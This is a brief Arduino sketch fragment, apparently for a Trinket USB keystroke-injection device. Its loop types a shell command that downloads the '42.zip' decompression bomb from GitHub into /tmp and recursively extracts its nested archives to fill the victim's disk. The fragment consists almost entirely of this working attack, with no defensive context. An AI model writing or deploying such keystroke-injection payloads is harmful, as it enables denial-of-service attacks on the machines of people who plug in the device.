...
void loop() {
  ...
  TrinketHidCombo.print("cd /tmp && curl -LO 'https://github.com/iamtraction/ZOD/raw/refs/heads/master/42.zip' && 7z x -p42 -y 42.zip && for i in 1 2 3 4; do find . -name '*.zip' -exec sh -c '7z x -p42 -y \"$1\" >/dev/null 2>&1 && rm \"$1\"' _ {} \\;; done");
